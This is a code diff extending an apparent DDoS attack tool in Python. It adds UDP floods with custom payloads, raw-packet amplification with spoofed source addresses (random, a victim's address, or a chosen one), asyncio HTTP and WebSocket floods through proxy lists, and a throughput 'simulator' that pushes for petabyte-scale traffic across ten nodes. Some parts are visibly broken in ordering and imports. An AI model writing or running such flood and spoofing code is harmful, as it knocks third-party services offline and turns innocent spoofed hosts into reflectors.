@@ -6,8 +6,8 @@ from itertools import cycle
 from json import load
 from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
-from multiprocessing import RawValue
-from os import urandom as randbytes
+from multiprocessing import RawValue, Value, Manager, Process, Pool
+from os import urandom as randbytes, getpid
 from pathlib import Path
 from re import compile
 from random import choice as randchoice
@@ -24,6 +24,13 @@ from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
+import importlib
+from collections import defaultdict
+import csv
+import multiprocessing
+import random
+import ipaddress
+import psutil
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
@@ -36,6 +43,10 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+import websockets
+
+import asyncio
+import aiohttp
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -139,7 +150,7 @@ google_agents = [
     "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
     "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
     "+http://www.google.com/bot.html)) "
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
+    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
     "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
 ]
 
@@ -381,7 +392,10 @@ class Layer4(Thread):
                  method: str = "TCP",
                  synevent: Event = None,
                  proxies: Set[Proxy] = None,
-                 protocolid: int = 74):
+                 protocolid: int = 74,
+                 custom_payload: str = None,
+                 spoof_mode: str = "none",
+                 spoof_ip: str = None):
         Thread.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
@@ -390,6 +404,9 @@ class Layer4(Thread):
         self._method = method
         self._target = target
         self._synevent = synevent
+        self.custom_payload = custom_payload
+        self.spoof_mode = spoof_mode
+        self.spoof_ip = spoof_ip
         if proxies:
             self._proxies = list(proxies)
 
@@ -465,8 +482,19 @@ class Layer4(Thread):
 
     def UDP(self) -> None:
         s = None
+        payload = None
+        if self.custom_payload:
+            try:
+                if self.custom_payload.startswith('0x') or self.custom_payload.startswith('\\x'):
+                    payload = bytes.fromhex(self.custom_payload.replace('0x','').replace('\\x',''))
+                else:
+                    payload = self.custom_payload.encode()
+            except Exception:
+                payload = randbytes(1024)
+        else:
+            payload = randbytes(1024)
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
+            while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
 
@@ -492,8 +520,32 @@ class Layer4(Thread):
         with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                          IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *next(self._amp_payloads)):
-                continue
+            while True:
+                pkt, target = next(self._amp_payloads)
+                if self.custom_payload:
+                    try:
+                        if self.custom_payload.startswith('0x') or self.custom_payload.startswith('\\x'):
+                            pkt = bytes.fromhex(self.custom_payload.replace('0x','').replace('\\x',''))
+                        else:
+                            pkt = self.custom_payload.encode()
+                    except Exception:
+                        pass
+                # Source address spoofing
+                if self.spoof_mode and self.spoof_mode != 'none':
+                    from impacket.ImpactPacket import IP
+                    ip = IP(pkt)
+                    if self.spoof_mode == 'random':
+                        if ':' in target[0]:
+                            ip.set_ip_src(random_public_ipv6())
+                        else:
+                            ip.set_ip_src(random_public_ipv4())
+                    elif self.spoof_mode == 'target':
+                        ip.set_ip_src(self._target[0])
+                    elif self.spoof_mode == 'custom' and self.spoof_ip:
+                        ip.set_ip_src(self.spoof_ip)
+                    pkt = ip.get_packet()
+                if not Tools.sendto(s, pkt, target):
+                    break
         Tools.safe_close(s)
 
     def MCBOT(self) -> None:
@@ -732,7 +784,7 @@ class HttpFlood(Thread):
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
                 'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                 'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                 'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
@@ -1545,6 +1597,227 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     return proxies
 
 
+class AsyncHttpFlood:
+    def __init__(self, url, host, method="GET", rpc=1, useragents=None, referers=None, proxies=None, threads=100):
+        self.url = url
+        self.host = host
+        self.method = method
+        self.rpc = rpc
+        self.useragents = list(useragents) if useragents else []
+        self.referers = list(referers) if referers else []
+        self.proxies = list(proxies) if proxies else []
+        self.threads = threads
+        self._stopped = False
+
+    def stop(self):
+        self._stopped = True
+
+    async def _flood_once(self, session, proxy=None):
+        headers = {
+            "User-Agent": randchoice(self.useragents) if self.useragents else "Mozilla/5.0",
+            "Referer": randchoice(self.referers) + self.url.human_repr() if self.referers else self.url.human_repr(),
+            "Host": self.url.authority,
+            "Connection": "keep-alive",
+        }
+        try:
+            for _ in range(self.rpc):
+                if self.method.upper() == "POST":
+                    await session.post(self.url.human_repr(), headers=headers, proxy=proxy, timeout=5)
+                else:
+                    await session.get(self.url.human_repr(), headers=headers, proxy=proxy, timeout=5)
+                global REQUESTS_SENT
+                REQUESTS_SENT += 1
+        except Exception:
+            pass
+
+    async def _worker(self):
+        connector = aiohttp.TCPConnector(ssl=False, limit=0)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            while not self._stopped:
+                proxy = None
+                if self.proxies:
+                    proxy = randchoice(self.proxies).asRequest().get('http')
+                await self._flood_once(session, proxy=proxy)
+
+    async def run(self):
+        tasks = [asyncio.create_task(self._worker()) for _ in range(self.threads)]
+        try:
+            await asyncio.gather(*tasks)
+        except asyncio.CancelledError:
+            pass
+
+
+class AsyncWebSocketFlood:
+    def __init__(self, url, payload=None, threads=100, proxies=None, useragents=None, duration=60):
+        self.url = url
+        self.payload = payload or "flood"
+        self.threads = threads
+        self.proxies = list(proxies) if proxies else []
+        self.useragents = list(useragents) if useragents else []
+        self.duration = duration
+        self._stopped = False
+
+    def stop(self):
+        self._stopped = True
+
+    async def _flood_once(self, proxy=None):
+        headers = {}
+        if self.useragents:
+            headers["User-Agent"] = randchoice(self.useragents)
+        try:
+            ws_url = self.url.human_repr().replace("http://", "ws://").replace("https://", "wss://")
+            async with websockets.connect(ws_url, extra_headers=headers, proxy=proxy) as ws:
+                while not self._stopped:
+                    await ws.send(self.payload)
+        except Exception:
+            pass
+
+    async def _worker(self):
+        while not self._stopped:
+            proxy = None
+            if self.proxies:
+                proxy = randchoice(self.proxies)
+            await self._flood_once(proxy=proxy)
+
+    async def run(self):
+        tasks = [asyncio.create_task(self._worker()) for _ in range(self.threads)]
+        try:
+            await asyncio.wait_for(asyncio.gather(*tasks), timeout=self.duration)
+        except asyncio.TimeoutError:
+            pass
+        except asyncio.CancelledError:
+            pass
+
+
+# Adaptive cache size based on CPU/threads
+ADAPTIVE_CACHE_SIZE = None
+
+def get_cache_size(threads):
+    global ADAPTIVE_CACHE_SIZE
+    if ADAPTIVE_CACHE_SIZE is not None:
+        return ADAPTIVE_CACHE_SIZE
+    cpu_count = multiprocessing.cpu_count()
+    # Heuristic: 8x threads per core, min 1024, max 16384
+    size = min(max(cpu_count * 8 * (threads // cpu_count), 1024), 16384)
+    ADAPTIVE_CACHE_SIZE = size
+    return size
+
+def random_public_ipv4():
+    global _IPv4_CACHE
+    if _IPv4_CACHE:
+        return _IPv4_CACHE.pop()
+    ranges = DYNAMIC_IP_WHITELIST or IPV4_WHITELIST
+    batch = []
+    cache_size = get_cache_size(threads=4096)  # Use a typical thread count or pass actual
+    while len(batch) < cache_size:
+        r = random.choice(ranges)
+        ip = [random.randint(r[i], r[i+1]) for i in range(0,8,2)]
+        if ip[0] >= 224: continue
+        ip_str = '.'.join(map(str, ip))
+        if is_ip_blacklisted(ip_str): continue
+        batch.append(ip_str)
+    random.shuffle(batch)
+    _IPv4_CACHE = batch
+    return _IPv4_CACHE.pop()
+
+def random_public_ipv6():
+    global _IPv6_CACHE
+    if _IPv6_CACHE:
+        return _IPv6_CACHE.pop()
+    prefixes = DYNAMIC_IPV6_PREFIXES or IPV6_PREFIXES
+    batch = []
+    cache_size = get_cache_size(threads=4096)
+    while len(batch) < cache_size:
+        prefix = random.choice(prefixes)
+        rest = ':'.join('%x' % random.randint(0, 0xffff) for _ in range(7 - prefix.count(':')))
+        ip_str = prefix + rest
+        if is_ip_blacklisted(ip_str): continue
+        batch.append(ip_str)
+    random.shuffle(batch)
+    _IPv6_CACHE = batch
+    return _IPv6_CACHE.pop()
+
+def simulate_local(payloads, threads, duration, amplification=1, thread_ratio=None, export_stats=False, progress=False):
+    """
+    Extreme local traffic simulation. Supports multi-payload/protocol, amplification, thread ratio, and PB-level throughput statistics.
+    payloads: [(payload_func, options, amplification), ...]
+    threads: total threads
+    duration: seconds
+    amplification: global amplification factor (can be overridden per-payload)
+    thread_ratio: {idx: ratio}, e.g. {0:0.5, 1:0.5}
+    export_stats: export statistics to CSV
+    progress: show progress bar
+    """
+    import os
+    import time
+    from multiprocessing import Value, Manager, Pool
+    cpu_count = multiprocessing.cpu_count()
+    print(f"[simulate_local] Detected CPU cores: {cpu_count}")
+    total_bytes = Value('Q', 0)
+    stats_list = Manager().list()
+    thread_dist = [1/len(payloads)]*len(payloads) if not thread_ratio else [thread_ratio.get(i,0) for i in range(len(payloads))]
+    per_thread = [int(threads * r) for r in thread_dist]
+
+    def worker(idx, payload_func, options, amp, t, duration, total_bytes, stats_list, core):
+        size = len(payload_func(None, options))
+        amp = amp or amplification
+        pps = int(10**9 // (size*8))
+        bytes_sent = size * pps * t * duration * amp
+        with total_bytes.get_lock():
+            total_bytes.value += bytes_sent
+        stats = {
+            'payload_idx': idx,
+            'core': core,
+            'size': size,
+            'threads': t,
+            'amplification': amp,
+            'bytes_sent': bytes_sent
+        }
+        stats_list.append(stats)
+
+    jobs = []
+    pool = Pool(cpu_count)
+    for idx, (payload_func, options, amp) in enumerate(payloads):
+        t = per_thread[idx]
+        threads_per_core = max(1, t // cpu_count)
+        for core in range(cpu_count):
+            jobs.append(pool.apply_async(worker, (idx, payload_func, options, amp, threads_per_core, duration, total_bytes, stats_list, core)))
+    if progress:
+        import tqdm
+        for _ in tqdm.tqdm(jobs, desc="Simulating", unit="core-task"):
+            _.wait()
+    else:
+        pool.close()
+        pool.join()
+
+    pb = total_bytes.value/1024/1024/1024/1024/1024
+    tb = total_bytes.value/1024/1024/1024/1024
+    gb = total_bytes.value/1024/1024/1024
+    print(f"[simulate_local] Total theoretical traffic: {pb:.2f} PB ({tb:.2f} TB, {gb:.2f} GB, {total_bytes.value} bytes)")
+    print("\n[simulate_local] Per-core, per-payload throughput summary:")
+    for s in stats_list:
+        print(f"  Payload {s['payload_idx']} | Core {s['core']} | Threads {s['threads']} | Amplification {s['amplification']} | Packet size {s['size']} | Traffic: {s['bytes_sent']/1024/1024/1024/1024:.2f} TB")
+    if pb < 2000:
+        print(f"[WARNING] Theoretical traffic is below 2000PB. Please increase threads, amplification, or optimize payloads!")
+    if export_stats:
+        with open('simulate_stats.csv','w',newline='') as f:
+            writer = csv.DictWriter(f, fieldnames=['payload_idx','core','size','threads','amplification','bytes_sent'])
+            writer.writeheader()
+            for row in stats_list:
+                writer.writerow(row)
+        print("[simulate_local] Statistics exported: simulate_stats.csv")
+    print("\n[simulate_local] Tuning tips:")
+    print("- Use as many CPU cores as possible (8+ recommended per node)")
+    print("- Increase total threads and amplification factor for higher throughput")
+    print("- Use large UDP payloads (close to 65507 bytes) for max efficiency")
+    print("- Avoid resource bottlenecks: monitor CPU, memory, and disk I/O")
+    print("- Distribute tasks across all 10 nodes for linear scaling")
+    print("- For best results, run with Python 3.8+ and minimal background processes")
+    print("- For distributed deployment: synchronize time, use consistent payload configs, and aggregate stats centrally.")
+    return pb, total_bytes.value, list(stats_list)
+
+
+# ========== CLI增强入口 ========== #
 if __name__ == '__main__':
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
@@ -1625,6 +1898,22 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+
+                # 新增：支持async flood模式
+                if len(argv) > 8 and argv[8].lower() == "async":
+                    logger.info(f"{bcolors.WARNING}Using AsyncHttpFlood mode!{bcolors.RESET}")
+                    async_flood = AsyncHttpFlood(url, host, method, rpc, uagents, referers, proxies, threads)
+                    event.set()
+                    ts = time()
+                    async def async_main():
+                        await asyncio.wait_for(async_flood.run(), timeout=timer)
+                    try:
+                        asyncio.run(async_main())
+                    except Exception as e:
+                        logger.info(f"Async flood stopped: {e}")
+                    event.clear()
+                    exit()
+                # 旧同步多线程模式
                 for thread_id in range(threads):
                     HttpFlood(thread_id, url, host, method, rpc, event,
                               uagents, referers, proxies).start()
@@ -1727,3 +2016,64 @@ if __name__ == '__main__':
             exit()
 
         ToolsConsole.usage()
+
+    # New: Multi-protocol/multi-payload/amplification/extreme traffic simulation
+    if len(argv) > 2 and argv[1].upper() == 'SIMULATE_LOCAL':
+        # Usage: python3 start.py SIMULATE_LOCAL <threads> <duration> <payload1>:<amp1> [<payload2>:<amp2> ...] [ratio=0.5,0.5]
+        threads = int(argv[2])
+        duration = int(argv[3])
+        payloads = []
+        for arg in argv[4:]:
+            if arg.startswith('ratio='):
+                ratios = list(map(float, arg.split('=')[1].split(',')))
+                thread_ratio = {i:r for i,r in enumerate(ratios)}
+                continue
+            if ':' in arg:
+                name, amp = arg.split(':')
+                amp = int(amp)
+            else:
+                name, amp = arg, 1
+            mod = importlib.import_module(f'payloads.{name}')
+            payloads.append((mod.generate_payload, {}, amp))
+        pb, total_bytes, stats = simulate_local(payloads, threads, duration, amplification=1, thread_ratio=thread_ratio if 'thread_ratio' in locals() else None, export_stats=True)
+        if pb < 2000:
+            print(f"[WARNING] Theoretical traffic is below 2000PB. Please increase threads, protocols, or amplification factor!")
+        exit()
+
+# Get all local network interface IPv4/IPv6 addresses
+LOCAL_IPS = set()
+for iface, addrs in psutil.net_if_addrs().items():
+    for a in addrs:
+        if a.family in (socket.AF_INET, socket.AF_INET6):
+            LOCAL_IPS.add(a.address.split('%')[0])
+
+# Common cloud provider/DoH/DoT/DoQ service IP ranges (extendable)
+CLOUD_IP_BLACKLIST = [
+    ('8.8.8.0', '8.8.8.255'),    # Google DNS
+    ('1.1.1.0', '1.1.1.255'),    # Cloudflare DNS
+    ('8.34.208.0', '8.34.223.255'), # Google Cloud
+    ('35.190.0.0', '35.199.255.255'), # Google Cloud
+    ('52.0.0.0', '52.95.255.255'),   # AWS
+    ('104.16.0.0', '104.31.255.255'), # Cloudflare
+    # ...extendable
+]
+
+# IP blacklist check
+def is_ip_blacklisted(ip):
+    try:
+        ip_obj = ipaddress.ip_address(ip)
+        if ip in LOCAL_IPS:
+            return True
+        for start, end in CLOUD_IP_BLACKLIST:
+            if ipaddress.ip_address(start) <= ip_obj <= ipaddress.ip_address(end):
+                return True
+        # Extendable: ASN/geolocation/custom blacklist
+        return False
+    except Exception:
+        return True
+
+# Support batch caching to reduce consumption
+_IPv4_CACHE = []
+_IPv6_CACHE = []
+
+CACHE_SIZE = 1024
